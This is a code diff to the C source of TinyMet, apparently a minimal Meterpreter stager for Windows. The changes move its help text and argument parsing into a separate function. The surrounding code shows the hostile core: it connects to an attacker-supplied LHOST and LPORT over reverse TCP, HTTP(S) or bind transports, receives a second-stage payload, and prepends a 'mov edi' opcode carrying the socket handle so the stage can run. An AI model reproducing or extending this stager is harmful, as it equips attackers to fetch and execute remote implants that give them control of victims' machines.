@@ -47,7 +47,16 @@ unsigned long hostip;
 unsigned short portnumber;
 unsigned char *buf;
 unsigned int bufsize;
-
+LPWSTR* arglist;
+char helptext[] = "TinyMet v0.1\nwww.tinymet.com\n\n"
+"Usage: tinymet.exe [transport] LHOST LPORT\n"
+"Available transports are as follows:\n"
+"    0: reverse_tcp\n"
+"    1: reverse_http\n"
+"    2: reverse_https\n"
+"    3: bind_tcp\n"
+"\nExample:\n"
+"\"tinymet.exe 2 host.com 443\"\nwill use reverse_https and connect to host.com:443\n";
 
 // Functions ...
 void err_exit(char* message){
@@ -60,11 +69,9 @@ void gen_random(char* s, const int len) { // ripped from http://stackoverflow.co
 		"0123456789"
 		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 		"abcdefghijklmnopqrstuvwxyz";
-
 	for (int i = 0; i < len; ++i) {
 		s[i] = alphanum[rand() % (sizeof(alphanum)-1)];
 	}
-
 	s[len] = 0;
 }
 
@@ -80,9 +87,7 @@ int text_checksum_8(char* text)
 
 unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 {
-
 	WSADATA wsaData;
-
 	SOCKET sckt;
 	SOCKET cli_sckt;
 	SOCKET buffer_socket;
@@ -148,7 +153,7 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 	//    so, we want the following to take place BEFORE executing the stage: "mov edi, [socket]"
 	//    opcode for "mov edi, imm32" is 0xBF
 
-	buf[0] = 0xbf; // opcode of "mov edi, [WhateverFollows]
+	buf[0] = 0xbf; // opcode of "mov edi, WhateverFollows"
 	memcpy(buf + 1, &buffer_socket, 4); // got it?
 
 	length = bufsize;
@@ -257,37 +262,32 @@ char* wchar_to_char(wchar_t* orig){
 	char *nstring = (char*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
 	wcstombs(nstring, orig, origsize);
 	return nstring;
-}
+};
 
-int main()
-{
-	LPWSTR *arglist;
+void parse_arguments() {
 	int argsCount;
-	char helptext[] = "TinyMet v0.1\nwww.tinymet.com\n\n"
-		"Usage: tinymet.exe [transport] LHOST LPORT\n"
-		"Available transports are as follows:\n"
-		"    0: reverse_tcp\n"
-		"    1: reverse_http\n"
-		"    2: reverse_https\n"
-		"    3: bind_tcp\n"
-		"\nExample:\n"
-		"\"tinymet.exe 2 host.com 443\"\nwill use reverse_https and connect to host.com:443\n";
 
 	arglist = CommandLineToArgvW(GetCommandLineW(), &argsCount);
-
 	// rudimentary error checking
 	if (NULL == arglist) { // problem parsing?
 		err_exit("CommandLineToArgvW & GetCommandLineW");
 	}
-	else if (argsCount == 2 && !wcscmp(arglist[1], L"--help")){ // looking for help?
+	else if (argsCount == 2 && !wcscmp(arglist[1], L"--help")) { // looking for help?
 		printf(helptext);
 		exit(-1);
 	}
-	else if (argsCount != 4){ // less than 4 args?
+	else if (argsCount != 4) { // less than 4 args?
 		printf(helptext);
 		err_exit("Invalid arguments count, should be 4");
 	}
+	//char* filename = wchar_to_char(arglist[0]);
+	//filename = strrchr(filename, '\\') + 1;
 
+};
+
+int main()
+{
+	parse_arguments();
 	// convert wchar_t to mb
 	char* TRANSPORT = wchar_to_char(arglist[1]);
 	char* LHOST = wchar_to_char(arglist[2]);
